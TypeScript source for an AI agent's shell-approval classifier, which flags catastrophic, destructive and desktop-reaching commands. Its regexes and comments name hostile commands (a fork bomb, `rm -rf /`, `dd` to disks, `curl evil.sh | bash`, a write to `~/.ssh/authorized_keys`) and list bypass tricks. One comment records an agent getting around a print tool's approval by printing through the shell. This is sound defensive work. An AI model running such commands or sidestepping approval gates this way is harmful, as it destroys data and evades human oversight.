// catastrophic-command.ts — the hardline floor for run_command.
//
// A tiny set of shell commands that must NEVER be auto-approved, no matter what
// approval rule (or "Yolo" auto_approve toggle) is in effect. An LLM slip — or a
// malicious community skill — must not be able to wipe the disk, format a drive,
// or power off the machine silently. When a command matches, the approval gate
// forces a human decision (require_approval) even under Yolo. This mirrors the
// un-bypassable floor in the Hermes agent.
//
// Scope is deliberately narrow: only commands that are irreversibly destructive
// to the whole machine. Ordinary dangerous commands (deleting a project folder,
// killing a process) stay governed by the normal approval rules — the floor is
// not a general safety net, it is the last-resort circuit breaker.

const FORK_BOMB = /:\s*\(\s*\)\s*\{\s*:\s*\|\s*:?\s*&\s*\}\s*;\s*:/;
const MKFS = /\bmkfs(\.\w+)?\b/i;
// [\s\S]*? (not [^\n]*) so a shell line-continuation between `dd ...\` and
// `of=/dev/sda` on the next line still matches — same newline-bypass class as
// the segment-split fix below, just for a top-level (non-anchored) pattern.
const DD_TO_DEVICE = /\bdd\b[\s\S]*?\bof=\/dev\/[a-z]/i;
// Power-state: unix (shutdown/reboot/halt/poweroff) + the PowerShell cmdlets
// that do the same thing on Windows (Stop-Computer / Restart-Computer).
const POWER_STATE = /\b(shutdown|reboot|halt|poweroff|stop-computer|restart-computer)\b/i;
const INIT_RUNLEVEL = /\binit\s+[06]\b/;
const OVERWRITE_DEVICE = />\s*\/dev\/(sd[a-z]|nvme\d|disk\d|hd[a-z])/i;
// diskpart: Windows disk-partitioning tool. Legitimate automation almost never
// needs it (its main destructive use is wiping/repartitioning a disk), so the
// floor just forces a human OK rather than trying to parse its sub-commands.
const DISKPART = /\bdiskpart\b/i;
// PowerShell disk cmdlets whose entire purpose is destructive (format/wipe/
// repartition a physical disk). Unambiguous cmdlet names — no plausible
// unrelated command shares them — so a plain \b regex is safe here, no
// token-anchoring needed.
const DISK_CMDLET = /\b(format-volume|clear-disk|initialize-disk)\b/i;
// awk with an inline program that shells out — `awk 'BEGIN{system("rm -rf /")}'`,
// `awk '{print | "sh"}'`. awk's program is opaque code (like `python -c`), so an
// awk that calls system()/getline-pipe/print-pipe into a shell can do anything.
// Plain text-processing awk (no system/pipe) is untouched. (A'2, audit followup.)
const AWK_CODE_EXEC =
  /\bawk\b[\s\S]*?(\bsystem\s*\(|\bgetline\b[^;]*\||["'][^"']*\|\s*["']?\s*(?:sh|bash|cmd))/i;

/** Strip one leading and/or trailing quote char — tokens coming out of a
 * `"quoted string"` (e.g. `powershell -Command "format C:"`) keep a stray
 * quote glued on after a plain whitespace split. */
function stripQuotes(token: string): string {
  return token.replace(/^["']|["']$/g, '');
}

/**
 * Collapse repeated path separators (`//` → `/`, `\\` → `\`) before any
 * pattern below runs. Every device/root/wildcard-target regex in this file
 * is written for a SINGLE separator (`\/dev\/sda`, `^[a-z]:\\?\*?$`, …); a
 * doubled or tripled separator (`rm -rf //`, `of=//dev/sda`, `C:\\`) reaches
 * the exact same target once the shell runs it, but dodges those regexes
 * outright. Normalizing here — once, up front — means every check below
 * stays a simple single-separator pattern instead of each needing its own
 * `/+` variant.
 */
function normalizeSlashes(s: string): string {
  return s.replace(/\/{2,}/g, '/').replace(/\\{2,}/g, '\\');
}

/** Last path segment, lowercased, `.exe`/`.com` suffix dropped — so
 * `/usr/bin/python3`, `C:\Python311\python.exe`, and `"python3"` all reduce
 * to the same bare interpreter name as a plain `python3`. */
function interpreterBasename(token: string): string {
  const t = stripQuotes(token);
  const base = t.split(/[\\/]/).pop() ?? t;
  return base.replace(/\.(exe|com)$/i, '').toLowerCase();
}

type InterpreterKind =
  | 'python'
  | 'node'
  | 'perl'
  | 'ruby'
  | 'php'
  | 'shell'
  | 'powershell'
  | 'expect';

/** Classifies a bare interpreter name (already basename'd) into the kind of
 * inline-eval flag it accepts, or `null` if it isn't a recognized
 * general-purpose interpreter at all. */
function interpreterKind(name: string): InterpreterKind | null {
  if (name === 'py' || /^python[0-9.]*$/.test(name)) return 'python';
  if (/^node(js)?$/.test(name)) return 'node';
  if (/^perl[0-9.]*$/.test(name)) return 'perl';
  if (/^ruby[0-9.]*$/.test(name)) return 'ruby';
  if (/^php[0-9.]*$/.test(name)) return 'php';
  if (['sh', 'bash', 'zsh', 'ksh', 'dash', 'ash'].includes(name)) return 'shell';
  if (name === 'powershell' || name === 'pwsh') return 'powershell';
  if (name === 'expect') return 'expect';
  return null;
}

/** True when `flag` (lowercased) is the inline-eval flag for `kind` — the
 * flag that hands the interpreter an opaque program as an ARGUMENT rather
 * than a script FILE (`-c`, `-e`, `-Command`, …). Deliberately narrow: `-m`,
 * `-File`, a bare script path, etc. run a named module/file, not arbitrary
 * inline text, so they're left to the normal (non-catastrophic) path. */
function isInlineEvalFlag(kind: InterpreterKind, flag: string): boolean {
  switch (kind) {
    case 'python':
      return flag === '-c';
    case 'node':
      return flag === '-e' || flag === '--eval' || flag === '-p' || flag === '--print';
    case 'perl':
    case 'ruby':
      return flag === '-e';
    case 'php':
      return flag === '-r';
    case 'shell':
    case 'expect':
      return flag === '-c';
    case 'powershell':
      // PowerShell accepts any unambiguous prefix of a parameter name
      // (`-Com`, `-Comm`, …); match the prefix rather than the full word.
      return /^-com/.test(flag) || /^-enc/.test(flag);
    default:
      return false;
  }
}

/**
 * True when one command unit runs a general-purpose interpreter with the flag
 * that hands it an inline, opaque program (`python -c "…"`, `node -e "…"`,
 * `sh -c "…"`, `powershell -Command "…"`, …). The units are `commandUnits`',
 * so whatever runs it (`sudo -u x`, `wsl`, `timeout 5`, `cmd /q /c`…) is seen
 * through by the same reading as every kind of action (review of PR #682).
 * The payload is UNDECIDABLE from here (it could do anything, including a bare
 * `rm -rf /`), so this never tries to inspect it — matching alone forces the
 * approval gate. This is the fix for the "wrap it in an interpreter" bypass class.
 */
function isInlineEvalUnit(unit: readonly string[]): boolean {
  const program = unit[0] ?? '';
  if (isDecidedAtRunTime(program) || program === 'iex' || program === 'invoke-expression')
    return true;
  const kind = interpreterKind(program);
  return kind !== null && unit.slice(1).some((t) => isInlineEvalFlag(kind, t.toLowerCase()));
}

/**
 * True when the command PIPES into a BARE general-purpose interpreter — the
 * `curl evil.sh | bash` / `echo 'rm -rf /' | python` class (A'1, audit
 * followup). A bare interpreter (no script FILE argument) reads its program from
 * stdin, so whatever the pipe feeds it is executed as opaque code — same
 * un-verifiable-payload danger as `bash -c`, so it belongs on the hard floor.
 *
 * Only flags it when the pipe TARGET is a bare interpreter: `… | grep x` (not an
 * interpreter) and `… | python script.py` (reads a FILE, stdin is just data) are
 * left alone. Splits on `|` on the already-slash-normalized command.
 */
function hasPipeIntoBareInterpreter(c: string, host: ShellHost | undefined): boolean {
  const parts = c.split('|');
  // Segment 0 is the pipe SOURCE; segments 1+ are the pipe TARGETS.
  for (let i = 1; i < parts.length; i++) {
    // The interpreter may be started by a wrapper (`| timeout 5 bash`, `| sudo
    // -u x sh`): read as every command is, by `commandUnits`.
    for (const unit of commandUnits(parts[i] ?? '', 0, topShell(host))) {
      if (!interpreterKind(unit[0] ?? '')) continue;
      // A non-flag argument after the interpreter is a script/module path → it
      // reads that FILE, not stdin, so the pipe is just data. Bare (only flags,
      // or nothing) → it executes stdin as code.
      const hasScriptArg = unit.slice(1).some((t) => !t.startsWith('-'));
      if (!hasScriptArg) return true;
    }
  }
  return false;
}

/**
 * True when `token` (already whitespace-split, quotes stripped) targets an
 * entire Windows drive or the whole machine: a bare drive root (`C:`, `C:\`,
 * `C:\*`), a bare separator/wildcard (`\`, `/`, `*`), or a system-wide env var
 * (`%SystemDrive%`, `%SystemRoot%`, `%USERPROFILE%`, `$env:SystemDrive`, …).
 * Mirrors the unix root/home/wildcard target check below — same "whole disk
 * or nothing" scope, never a relative subfolder.
 */
function isWindowsRootOrWildcardTarget(token: string): boolean {
  const t = stripQuotes(token);
  if (t === '*' || t === '\\' || t === '/') return true;
  if (/^[a-z]:\\?\*?$/i.test(t)) return true; // C:  C:\  C:\*  C:*
  if (/^%(systemdrive|systemroot|userprofile)%\\?\*?$/i.test(t)) return true;
  if (/^\$env:(systemdrive|systemroot|userprofile)\\?\*?$/i.test(t)) return true;
  return false;
}

/**
 * True when `cmd` contains a catastrophic, machine-wide-destructive operation
 * that must always require explicit human approval (never auto-run).
 */
export function isCatastrophicCommand(cmd: string, host?: ShellHost): boolean {
  if (typeof cmd !== 'string' || cmd.trim() === '') return false;
  // `shutdown --help` prints and exits (Reviewer A, #582 pass 2). Only the
  // long forms and `/?` here: `shutdown -h` HALTS the machine.
  const units = commandUnits(withoutRedirections(cmd), 0, topShell(host)).filter(
    (u) => !runsAnother(u),
  );
  if (
    units.length > 0 &&
    units.every((u) => u.length >= 2 && u.slice(1).every((t) => FLOOR_READ_FLAGS.has(t)))
  ) {
    return false;
  }
  const c = normalizeSlashes(cmd.trim());

  if (
    FORK_BOMB.test(c) ||
    MKFS.test(c) ||
    DD_TO_DEVICE.test(c) ||
    POWER_STATE.test(c) ||
    INIT_RUNLEVEL.test(c) ||
    OVERWRITE_DEVICE.test(c) ||
    DISKPART.test(c) ||
    DISK_CMDLET.test(c)
  ) {
    return true;
  }

  // NOTE (ComfyUI regression, 2026-07): inline interpreter-eval (`python -c`,
  // `node -e`, `sh -c`, `… | python`, awk-code) is NO LONGER on the
  // catastrophic hard floor. It is opaque but not inherently machine-wide
  // destructive — and hard-refusing it (even after approval) broke the
  // ubiquitous `curl … | python -c "json.load(...)"` idiom, systematically
  // killing legitimate workflows. It is now classed as DESTRUCTIVE/heavy
  // (isInlineInterpreterEvalCommand → isDestructiveOrHeavyCommand): gated for a
  // human at propose_confirm/destructive_gate, auto-run under fully_autonomous
  // (the owner's explicit "run everything" trust), and — crucially —
  // APPROVABLE (it executes after a human OK). Only the deterministic
  // machine-destroyers above stay refused-even-after-approval.

  // The checks below are ANCHORED on the program of each command the line
  // runs (`commandUnits`): what `cmd /q /c`, `powershell -Command`, `sh -c`,
  // `wsl`, `timeout 5`, `sudo -u x`, `nohup`, `xargs`… start is a command of
  // its own (review of PR #682: `wsl rm -rf /` and `timeout 5 rm -rf /`
  // passed the floor, its own list of wrappers knew only cmd, powershell, sh,
  // bash and sudo). A quoted mention (`echo "rm -rf /"`) is an argument of
  // `echo`, never a command, so no check can match it.
  for (const unit of commandUnits(withoutRedirections(c), 0, topShell(host))) {
    const cmdWord = unit[0] ?? '';
    const args = unit.slice(1);
    const s = unit.join(' ');

    // `rm` (unix, and PowerShell's `rm` alias for Remove-Item) recursive +
    // force against a machine-wide target — unix root/home/wildcard (/, /*,
    // ~, $HOME, bare *) OR a Windows drive root/wildcard/system env var
    // (`rm -r -Force C:\`, `rm -Recurse -Force C:\`, `cmd /c rm -rf /`). The
    // loose "-\S*r" / "-\S*f" match is deliberate: it must catch both a
    // bundled short flag (`-rf`) and a PowerShell long flag (`-Recurse`/
    // `-Force`) — both spellings contain the letter regardless of form.
    if (/^rm$/i.test(cmdWord)) {
      const recursive = /\s-\S*r/i.test(s) || /\s--recursive\b/i.test(s);
      const force = /\s-\S*f/i.test(s) || /\s--force\b/i.test(s);
      if (recursive && force) {
        if (/\s--no-preserve-root\b/i.test(s)) return true;
        // a root / home / wildcard target among its arguments
        if (/(\s|=)(\/|\/\*|~|~\/\*?|\$HOME\/?\*?|\*)(\s|$|"|')/.test(s)) return true;
        if (args.some((t) => isWindowsRootOrWildcardTarget(t))) return true;
      }
    }

    // Windows `format <drive>:` — anchored on the program, so `clang-format`,
    // `git format-patch`, `dotnet format`, and the `Format-Table` cmdlet are
    // left alone. A LATER word must be a bare drive-letter target.
    if (
      /^format(\.(com|exe))?$/i.test(cmdWord) &&
      args.some((d) => /^[a-z]:([\\/]\*?)?$/i.test(d))
    ) {
      return true;
    }

    // Windows recursive+forced delete (Remove-Item/ri/del/erase/rd/rmdir)
    // against a machine-wide target — mirrors the `rm` check above, same
    // root-only scope. `Remove-Item .\build -Recurse -Force` (a relative
    // project subfolder) must NOT match; only a drive root / wildcard / system
    // env var does.
    if (/^(ri|remove-item|del|erase|rd|rmdir)$/i.test(cmdWord)) {
      const psRecursiveForce = /(^|\s)-r(ecurse)?\b/i.test(s) && /(^|\s)-f(orce)?\b/i.test(s);
      const cmdRecursiveForce = /\/s\b/i.test(s) && /\/q\b/i.test(s);
      if (psRecursiveForce || cmdRecursiveForce) {
        if (args.some((t) => isWindowsRootOrWildcardTarget(t))) return true;
      }
    }
  }

  return false;
}

/**
 * True when `cmd` runs an OPAQUE interpreter program the classifier can't
 * inspect: an inline-eval flag (`python -c`, `node -e`, `sh -c`,
 * `powershell -Command`, …), a pipe into a bare interpreter (`… | python`,
 * `curl … | bash`), or awk executing code (`awk '…system…'`). With or without
 * one pass-through leader (`sudo`/`env`/`cmd /c`) in front.
 *
 * This class is NO LONGER catastrophic (ComfyUI regression fix, 2026-07): it is
 * treated as DESTRUCTIVE/heavy — gated for a human at propose_confirm/
 * destructive_gate, auto-run under fully_autonomous, and APPROVABLE (it runs
 * after a human OK, unlike the machine-destroyers). The runner also uses this
 * predicate to tailor its approval-card wording.
 */
export function isInlineInterpreterEvalCommand(cmd: string, host?: ShellHost): boolean {
  if (typeof cmd !== 'string' || cmd.trim() === '') return false;
  const c = normalizeSlashes(cmd.trim());
  if (AWK_CODE_EXEC.test(c) || hasPipeIntoBareInterpreter(c, host)) return true;
  return commandUnits(withoutRedirections(c), 0, topShell(host)).some(isInlineEvalUnit);
}

// ── Destructive / heavy actions (for the `destructive_gate` autonomy level) ──────
// BROADER than the catastrophic floor: actions that mutate the machine in a heavy
// or hard-to-undo way — file deletions, software installs / large downloads, disk
// ops, process/service control, recursive permission changes, destructive VCS.
// Under `destructive_gate`, ordinary work auto-approves but THESE still require a
// human OK. We deliberately err toward asking: a false "ask" is cheap, a silent
// 13 GB install (`comfy install`) or an `rm` is not.
/**
 * A program's global options, between its name and its subcommand: `git -C
 * dir`, `git -c k=v`, `git --no-pager`, `docker --context x`, `docker compose
 * -f file`. A pattern that only knew the short form (`git lfs pull`, `docker
 * pull`) let the real forms through unclassified (Reviewer A, #582).
 */
const GLOBAL_OPTIONS = String.raw`(?:\s+(?:--[\w-]+(?:=\S+|\s+[^-\s]\S*)?|-[A-Za-z](?:\s+[^-\s]\S*)?))*`;

/** `program [global options] subcommand…`, the form every such tool accepts. */
function subcommand(program: string, rest: string): RegExp {
  return new RegExp(String.raw`\b(?:${program})${GLOBAL_OPTIONS}\s+${rest}`, 'i');
}

/**
 * The same patterns, sorted by what a person would call them (#464). The
 * autonomy checklist lets an owner allow, ask or forbid each KIND of action;
 * their union below is still exactly what `destructive_gate` has always gated.
 */
export const STATIC_SHELL_CATEGORY_PATTERNS = {
  delete_files: [
    /\b(rm|rmdir|unlink|shred)\b/i, // delete (unix)
    /\bdel\s|\bRemove-Item\b|\brd\s+\/s/i, // delete (windows/ps)
    /\bfind\b[^\n]*-delete\b/i, // find … -delete
    // destructive VCS: work thrown away
    subcommand('git', String.raw`push\b[^\n]*(?:--force|-f\b)`),
    subcommand('git', String.raw`reset\s+--hard\b`),
    subcommand('git', String.raw`clean\s+-\S*f`),
    subcommand('git', String.raw`branch\s+-D\b`),
  ],
  install_software: [
    /\b(pip3?|npm|pnpm|yarn|apt|apt-get|yum|dnf|brew|pacman|choco|winget|uvx|pipx|cargo|gem|conda|comfy)\b[^\n]*\binstall\b/i, // pkg install
    /\b(npm|pnpm|yarn|bun)\s+(i|add|ci)\b|\bInstall-(Module|Package)\b/i, // npm i, pnpm add, PowerShell modules
    /\buv\s+(pip\s+install|add|tool\s+install)\b/i, // uv (review of PR #476)
    /\bgo\s+install\b/i, // go install
  ],
  // A command is filed by what it DOES (#581): fetching files (a model, an
  // archive, an image) is a download, whatever tool fetches it; installing
  // software is the kind above. `comfy model download` and `pip download` sat
  // in install_software, so an owner who let an agent fetch models without
  // asking had to let it install software.
  download: [
    // `iwr` is Invoke-WebRequest's alias (review of PR #476). `curl` is not
    // here: it downloads only when it writes a file (`-o`, `-O`, `--output`,
    // `-sLoC:\x`), read by `curlWritesAFile` with the same reader as its
    // targets, which a pattern cannot do (`-XPOST` swallows its group).
    /\bwget\b|\bInvoke-WebRequest\b|\biwr\b|\bStart-BitsTransfer\b|\baria2c\b/i, // large download
    subcommand('git', String.raw`clone\b`), // clone
    // `download` / `pull` must END the word: `comfy model download-status`,
    // `downloads` and `download-cancel` only read or stop one, and `\b` alone
    // let `download-status` match (run ca5753a8 asked the owner before every
    // progress check, #552).
    /\bcomfy\b[^\n]*\bmodel\s+download(?![\w-])|\bpip3?\b[^\n]*\bdownload(?![\w-])/i, // model / package files
    subcommand('hf|huggingface-cli', String.raw`download(?![\w-])`), // Hugging Face files
    subcommand('ollama', String.raw`pull(?![\w-])`), // models
    subcommand('git', String.raw`lfs\s+(?:pull|fetch)(?![\w-])`), // LFS objects
    // images: `docker pull`, `docker image pull`, `docker compose -f x pull`,
    // and the standalone compose binaries (`docker-compose pull`)
    subcommand(
      'docker-compose|podman-compose|docker|podman',
      String.raw`(?:(?:image|compose)${GLOBAL_OPTIONS}\s+)?pull(?![\w-])`,
    ),
  ],
  stop_programs: [
    /\b(kill|pkill|killall|taskkill)\b|\bStop-Process\b|\bStop-Service\b/i, // process kill
    /\bsystemctl\b|\bsc\s+(stop|delete)\b|\bservice\b[^\n]*\b(stop|restart)\b|\bnet\s+stop\b/i, // service control
  ],
  system_settings: [
    /\bmkfs(\.\w+)?\b|\bdd\b[^\n]*\bof=|\b(format|fdisk|parted|diskpart)\b/i, // disk ops
    /\b(chmod|chown|chgrp|takeown|icacls)\b|\bSet-Acl\b|\breg\s+(add|delete|import)\b/i, // permissions, ownership, registry
  ],
} as const satisfies Record<string, readonly RegExp[]>;

/**
 * The kinds of action read from a command's text: the patterns above, plus
 * inline code (`python -c "…"`), whose program is text nobody can read ahead,
 * and what reaches past the computer's files (`reachesOut`).
 */
export type StaticShellCategory =
  | keyof typeof STATIC_SHELL_CATEGORY_PATTERNS
  | 'inline_code'
  | 'open_or_send';

// ── What reaches past the computer's files (#667) ────────────────────────────
// 01/10: asked to print, an agent holding a print tool that asks the person
// first ran `Start-Process … -Verb Print` through the shell instead, and no
// kind of action covered it. The rule: a command reaches out when the program
// it runs hands something to the person's desktop (a window, a file opened in
// its program, a notification), to a device (a printer), or to someone (mail).
// Read from the program and its words, like every kind here: a script, inline
// code or a .NET/COM call that does the same is not seen (#628, a sandbox).

/** They exist to hand a file, an address or a message to the desktop or a device. */
const OUTWARD_PROGRAMS = new Set([
  // the OS's "open this" (macOS, Linux desktops, WSL, Windows)
  'open',
  'xdg-open',
  'xdg-email',
  'gnome-open',
  'kde-open',
  'kde-open5',
  'wslview',
  'sensible-browser',
  'x-www-browser',
  'invoke-item',
  'ii',
  'explorer',
  'rundll32',
  'osascript',
  'notify-send',
  // printers
  'lp',
  'lpr',
  'out-printer',
  'print',
  // mail
  'sendmail',
  'send-mailmessage',
  'msmtp',
  'ssmtp',
  'swaks',
  'mail',
  'mailx',
  'mutt',
]);

/** `program subcommand` launchers: `gio open`, `kioclient exec`. */
const OUTWARD_SUBCOMMANDS: Record<string, ReadonlySet<string>> = {
  gio: new Set(['open', 'launch']),
  kioclient: new Set(['exec']),
  kioclient5: new Set(['exec']),
};

/**
 * The flags that keep a desktop program windowless (its command-line uses).
 * `x*` is a prefix, `x=` also matches `x=value`, `a b` is two words.
 */
const VSCODE_CLI = [
  '--install-extension',
  '--uninstall-extension',
  '--list-extensions',
  '--update-extensions',
  '--locate-shell-integration-path',
  'tunnel',
  'serve-web',
];
const BROWSER_CLI = ['--headless*'];
const LIBREOFFICE_CLI = ['--headless*', '--convert-to', '--print-to-file', '--cat'];

/**
 * Desktop programs of Windows, macOS and Linux: editors, viewers, office
 * suites, browsers, mail clients, file managers, terminals (#667, #686). Run,
 * they open a window on the person's screen, unless one of their command-line
 * flags keeps them windowless. A desktop program not here is not seen: the
 * OS launchers (`start`, `open`, `xdg-open`) are, whatever they open.
 */
const DESKTOP_PROGRAMS: ReadonlyMap<string, readonly string[]> = new Map<string, readonly string[]>(
  [
    // editors
    ...['code', 'code-insiders', 'codium', 'vscodium', 'cursor', 'windsurf'].map(
      (p) => [p, VSCODE_CLI] as const,
    ),
    ...[
      'zed',
      'subl',
      'sublime_text',
      'atom',
      'notepad',
      'notepad++',
      'wordpad',
      'write',
      'gedit',
      'gnome-text-editor',
      'kate',
      'kwrite',
      'mousepad',
      'pluma',
      'xed',
      'leafpad',
      'featherpad',
      'gvim',
      'mvim',
      'macvim',
      'bbedit',
      'mate',
    ].map((p) => [p, []] as const),
    ['emacs', ['--batch', '-batch', '--script', '-nw', '--no-window-system']],
    // viewers, images, media
    ...[
      'mspaint',
      'evince',
      'okular',
      'eog',
      'eom',
      'feh',
      'gwenview',
      'xreader',
      'atril',
      'zathura',
      'mupdf',
      'xpdf',
      'sumatrapdf',
      'acrord32',
      'acrobat',
      'foxitreader',
      'foxitpdfreader',
      'qpdfview',
      'ristretto',
      'shotwell',
      'gthumb',
      'totem',
      'celluloid',
      'wmplayer',
      'mpv',
    ].map((p) => [p, []] as const),
    ['gimp', ['-i', '--no-interface']],
    ['inkscape', ['--export-*', '--query-*', '-o']],
    ['krita', ['--export', '--export-filename', '--export-pdf']],
    ['vlc', ['-I dummy', '--intf=dummy']],
    // office
    ...['winword', 'excel', 'powerpnt', 'onenote', 'msaccess', 'mspub', 'visio', 'gnumeric'].map(
      (p) => [p, []] as const,
    ),
    ...['soffice', 'libreoffice', 'lowriter', 'localc', 'loimpress'].map(
      (p) => [p, LIBREOFFICE_CLI] as const,
    ),
    ['abiword', ['--to=', '-t']],
    // browsers
    ...[
      'msedge',
      'chrome',
      'google-chrome',
      'google-chrome-stable',
      'chromium',
      'chromium-browser',
      'firefox',
      'librewolf',
      'brave',
      'brave-browser',
      'opera',
      'vivaldi',
      'iexplore',
      'epiphany',
      'falkon',
      'konqueror',
      'midori',
    ].map((p) => [p, BROWSER_CLI] as const),
    // mail, file managers, terminals, small tools
    ...[
      'thunderbird',
      'outlook',
      'evolution',
      'kmail',
      'geary',
      'nautilus',
      'dolphin',
      'thunar',
      'nemo',
      'pcmanfm',
      'caja',
      'krusader',
      'gnome-terminal',
      'konsole',
      'xterm',
      'xfce4-terminal',
      'terminator',
      'alacritty',
      'kitty',
      'wezterm',
      'tilix',
      'wt',
      'calc',
      'gnome-calculator',
      'kcalc',
    ].map((p) => [p, []] as const),
  ],
);

/** A desktop program's print flags (`notepad /p`, `AcroRd32 /t`, `soffice -p`): they print, window or not. */
const PRINT_FLAGS = new Set(['/p', '/pt', '/t', '-p', '-pt', '--pt']);

/** True when one of `flags` (a desktop program's command-line uses) is among `args`. */
function keepsWindowless(args: readonly string[], flags: readonly string[]): boolean {
  const lower = args.map((a) => a.toLowerCase());
  return flags.some((flag) => {
    const f = flag.toLowerCase();
    if (f.includes(' ')) {
      const [first, second] = f.split(' ');
      return lower.some((a, i) => a === first && lower[i + 1] === second);
    }
    if (f.endsWith('*')) return lower.some((a) => a.startsWith(f.slice(0, -1)));
    if (f.endsWith('=')) return lower.some((a) => a.startsWith(f) || a === f.slice(0, -1));
    return lower.some((a) => a === f || a.startsWith(`${f}=`));
  });
}

/** Files a desktop hands to their program when they are run or launched. */
const DOCUMENT =
  /\.(txt|md|log|csv|pdf|rtf|docx?|xlsx?|pptx?|od[tsp]|html?|xml|json|png|jpe?g|gif|bmp|svg|webp|tiff?|mp[34]|wav|mov|avi|url|lnk)$/i;

/** A file the desktop opens in its program, or an address it opens in a browser or mail client. */
function isDocumentOrAddress(word: string): boolean {
  return /^[a-z][\w+.-]*:\/\//i.test(word) || /^mailto:/i.test(word) || DOCUMENT.test(word);
}

/** Start-Process's switches, which take no value (`-Verbose` is not `-Verb`). */
const START_SWITCHES = new Set([
  'nonewwindow',
  'nnw',
  'wait',
  'passthru',
  'usenewenvironment',
  'loaduserprofile',
  'lup',
  'verbose',
  'debug',
]);

/** Start-Process's parameters that take a value, by full name or a prefix of three letters or more. */
const START_PARAMETERS = [
  'filepath',
  'argumentlist',
  'windowstyle',
  'workingdirectory',
  'verb',
  'credential',
  'redirectstandardinput',
  'redirectstandardoutput',
  'redirectstandarderror',
  'environment',
];

/** cmd's `start`, and PowerShell's `Start-Process` with its aliases. */
const LAUNCHERS = new Set(['start', 'start-process', 'saps']);

/** What a launcher was asked to start, and how (#667). */
interface Launch {
  /** The program, file or address it starts; null when the text does not say. */
  target: string | null;
  /** The words given to what it starts (`-ArgumentList`, or what follows the target). */
  launched: string[];
  /** A shell verb: `-Verb Print`, `-Verb Open`, `-Verb RunAs`… */
  verb: boolean;
  /** No window: `start /b`, `-NoNewWindow`, `-WindowStyle Hidden`. */
  windowless: boolean;
}

/** Read the words of `start` / `Start-Process`, in cmd's form and in PowerShell's. */
function readLaunch(args: readonly string[]): Launch {
  const launch: Launch = { target: null, launched: [], verb: false, windowless: false };
  for (let i = 0; i < args.length; i++) {
    const word = args[i] ?? '';
    if (word.startsWith('-')) {
      const [rawName, inlineValue] = word.slice(1).toLowerCase().split(':', 2);
      const name = rawName ?? '';
      if (START_SWITCHES.has(name)) {
        if (name === 'nonewwindow' || name === 'nnw') launch.windowless = true;
        continue;
      }
      const param =
        START_PARAMETERS.find((p) => p === name) ??
        (name.length >= 3 ? START_PARAMETERS.find((p) => p.startsWith(name)) : undefined);
      const value = inlineValue ?? args[++i] ?? '';
      if (param === 'verb') launch.verb = true;
      else if (param === 'windowstyle' && value.toLowerCase() === 'hidden')
        launch.windowless = true;
      else if (param === 'filepath') launch.target = value;
      else if (param === 'argumentlist') launch.launched.push(...value.split(/[\s,]+/));
      continue;
    }
    if (launch.target === null) {
      // cmd's own flags come before what it starts: `start /b /min prog`.
      if (/^\/\w+$/.test(word)) {
        if (word.toLowerCase() === '/b') launch.windowless = true;
        continue;
      }
      launch.target = word;
      continue;
    }
    launch.launched.push(...word.split(/[\s,]+/));
  }
  launch.launched = launch.launched.filter((w) => w !== '');
  return launch;
}

/**
 * cmd's `start` and PowerShell's `Start-Process` hand what they start to the
 * desktop: a shell verb (`-Verb Print`) is a desktop action, and so is a
 * window, and so is a file or an address (opened in its program). Without
 * any (`start /b node server.js`, `-WindowStyle Hidden`), they start a program
 * in the background, the dev server idiom on Windows; what that program does
 * is read as its own command (`commandUnits`).
 */
function launchReachesOut(args: readonly string[]): boolean {
  const { target, verb, windowless } = readLaunch(args);
  return verb || !windowless || (target !== null && isDocumentOrAddress(target));
}

/** True when one command unit hands something to the desktop, a device or someone (#667). */
function reachesOut(unit: readonly string[]): boolean {
  const program = unit[0] ?? '';
  const args = unit.slice(1);
  if (OUTWARD_PROGRAMS.has(program)) return true;
  if (OUTWARD_SUBCOMMANDS[program]?.has((args[0] ?? '').toLowerCase())) return true;
  if (LAUNCHERS.has(program)) return launchReachesOut(args);
  const windowless = DESKTOP_PROGRAMS.get(program);
  if (windowless !== undefined) {
    return args.some((a) => PRINT_FLAGS.has(a.toLowerCase())) || !keepsWindowless(args, windowless);
  }
  // `.\report.txt`, `cmd /c report.pdf`: a document run by name opens in its program.
  return isDocumentOrAddress(program);
}

const DESTRUCTIVE_PATTERNS: RegExp[] = Object.values(STATIC_SHELL_CATEGORY_PATTERNS).flat();

/**
 * The kinds of action a command performs, read from its text alone (#464).
 * Inline code (`python -c "…"`, `node -e "…"`) is its own kind: what it does is
 * not read, it is asked about, as `destructive_gate` always did.
 */
export function staticShellCategories(cmd: string, host?: ShellHost): StaticShellCategory[] {
  if (typeof cmd !== 'string' || cmd.trim() === '') return [];
  // Read from the PROGRAMS the command runs, never from any word of its text
  // (review of PR #474, Reviewer A, P1): `git commit -m "rm old refs"` does not
  // delete, and `clang-format` is not `format`. A pattern counts only where it
  // matches at the start of a command the shell will run — each segment, and
  // the commands wrapped in `bash -c`, `cmd /c`, `powershell -Command`,
  // `xargs`, `find -exec` and `$(…)`. Hermes Agent anchors its patterns the
  // same way. Quotes and carets are removed by the tokenizer, so `r""m` and
  // `r^m` still read as `rm`.
  const found = new Set<StaticShellCategory>();
  for (const unit of commandUnits(withoutRedirections(cmd), 0, topShell(host))) {
    for (const category of unitCategories(unit)) found.add(category);
  }
  // `curl URL > file` downloads without `-o`: the redirection is dropped by
  // the tokenizer, so it is read on the text of that segment. `curl --version
  // > log` is still a read.
  if (
    // A wrapper's payload (`sh -c "curl URL > f"`) starts after a quote.
    /(^|[;&|("'`]\s*)(curl|irm|Invoke-RestMethod)\b(?:[^;&|\n]|&(?=>))*>/i.test(cmd) &&
    !commandUnits(withoutRedirections(cmd), 0, topShell(host))
      .filter((u) => /^(curl|irm|invoke-restmethod)$/i.test(u[0] ?? ''))
      .every(isVersionOrHelpOnly)
  ) {
    found.add('download');
  }
  if (isInlineInterpreterEvalCommand(cmd, host)) found.add('inline_code');
  return [...found];
}

/**
 * Where a download line writes, read from its text (#614, revue Nodal de la PR
 * #618, P1b). A download runs without asking because it lands in the agent's
 * workspace; `curl -o ~/.ssh/authorized_keys` or `git clone URL D:\elsewhere`
 * does not. The runner resolves these against the command's working folder
 * and the job's workspaces (packages/tools, shell-checklist.ts).
 *
 * - `dirs`: the folders the line moves into (`cd`, `pushd`, `Push-Location`,
 *   `Set-Location`), in order, `null` when unreadable (`cd` alone, `cd -`,
 *   `popd`, a variable).
 * - `targets`: each place a fetcher writes, as written (`'.'` for the working
 *   folder: `curl -O`, `wget URL`, `git clone URL`), or `null` when the text
 *   does not say where (a variable, `~`, a sub-shell): that asks, invariant #4.
 *   `after` is how many of `dirs` come before it in the line: the target is
 *   judged from the folder the line is in at that point (revue passe 2). A
 *   shell redirection (`> file`) is cut from the words before they are read,
 *   so its place in the line is not known: `after` is null, and it is judged
 *   from every folder of the line.
